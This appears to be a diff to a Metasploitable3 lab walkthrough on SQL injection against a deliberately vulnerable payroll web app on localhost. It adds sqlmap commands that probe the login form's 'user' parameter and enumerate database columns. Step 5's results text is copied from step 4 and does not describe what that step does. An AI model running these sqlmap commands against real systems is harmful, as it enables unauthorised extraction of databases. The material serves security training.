@@ -39,8 +39,20 @@ RESULTS: The web page will return all the user content
    ![alt text](https://github.com/ACIC-Africa/metasploitable3/blob/master/images/payroll_app/result-3.png "RESULT 2")
 4. <b>Use SQLMap to extract the database using the following commands:</b>
 
-   ```sqlmap -u http://127.0.0.1:7000/payroll_app.php --data="user=admin&password=admin&s=OK" -p user --method POST```
+   ```
+   sqlmap -u http://127.0.0.1:7000/payroll_app.php --data="user=admin&password=admin&s=OK" -p user --method POST
+   ```
 
 RESULTS: SQLMap will identify whether the web application is vulnerable to SQL Injection
    ![alt text](https://github.com/ACIC-Africa/metasploitable3/blob/master/images/payroll_app/step-4-sqlmap.png "STEP 4")
    ![alt text](https://github.com/ACIC-Africa/metasploitable3/blob/master/images/payroll_app/result-4-1.png "RESULT 4")
+   
+5. <b>Use SQLMap to extract the columns in the table</b>
+
+   ```
+   sqlmap -u http://127.0.0.1:7000/payroll_app.php --data="user=admin&password=admin&s=OK" -p user --method POST --columns
+   ```
+
+RESULTS: SQLMap will identify whether the web application is vulnerable to SQL Injection
+   ![alt text](https://github.com/ACIC-Africa/metasploitable3/blob/master/images/payroll_app/step-5-1.png "STEP 5")
+   ![alt text](https://github.com/ACIC-Africa/metasploitable3/blob/master/images/payroll_app/step-5-2.png "RESULT 5")   
